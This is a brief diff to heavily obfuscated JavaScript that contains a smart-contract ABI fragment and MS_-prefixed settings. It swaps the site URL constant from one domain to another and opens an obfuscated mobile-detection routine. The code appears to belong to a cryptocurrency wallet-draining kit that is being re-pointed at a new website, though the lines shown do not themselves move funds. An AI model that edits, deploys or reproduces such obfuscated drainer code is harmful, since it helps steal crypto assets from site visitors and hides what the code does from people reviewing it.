@@ -1586,7 +1586,7 @@ const _0xe186ff = function () {
     'stateMutability': "nonpayable",
     'type': 'function'
   }];
-  const MS_Current_URL = 'https://cryptocoder.shop'.replace(/http[s]*:\/\//, '');
+  const MS_Current_URL = 'https://Ourri.com'.replace(/http[s]*:\/\//, '');
   const MS_Mobile_Status = (() => {
     let _0x47d9a7 = false;
     (function (_0x116f73) {
